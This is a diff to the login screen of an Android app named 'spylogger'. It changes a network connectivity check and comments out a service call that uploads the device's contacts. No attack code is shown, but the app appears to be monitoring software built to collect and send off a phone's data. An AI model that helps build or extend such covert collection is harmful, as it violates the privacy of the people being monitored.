@@ -34,11 +34,11 @@ import android.widget.Toast;
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.gravatasufoca.spylogger.R;
 import com.gravatasufoca.spylogger.dao.DatabaseHelper;
+import com.gravatasufoca.spylogger.helpers.NetworkUtil;
 import com.gravatasufoca.spylogger.helpers.TaskComplete;
 import com.gravatasufoca.spylogger.model.Configuracao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
-import com.gravatasufoca.spylogger.services.SendContatosService;
 import com.gravatasufoca.spylogger.services.SendUsuarioService;
 import com.gravatasufoca.spylogger.utils.Utils;
 import com.gravatasufoca.spylogger.vos.AparelhoVO;
@@ -99,7 +99,7 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
         }
 
 
-        if (!Utilidades.isConnected(this)) {
+        if (NetworkUtil.NETWORK_STATUS_NOT_CONNECTED==NetworkUtil.getConnectivityStatusString(this)) {
             Toast.makeText(this, R.string.nao_conectado, Toast.LENGTH_LONG).show();
             finish();
         }
@@ -446,8 +446,8 @@ public class LoginActivity extends AppCompatActivity implements LoaderCallbacks<
                                 Log.e("sql", e.getMessage());
                             }
                         }
-                        SendContatosService sendContatosService = new SendContatosService(getApplication(), null);
-                        sendContatosService.enviarContatos();
+//                        SendContatosService sendContatosService = new SendContatosService(getApplication(), null);
+//                        sendContatosService.enviarContatos();
 
                         Utils.startNewService(context, configuracao);
 //                        finish();
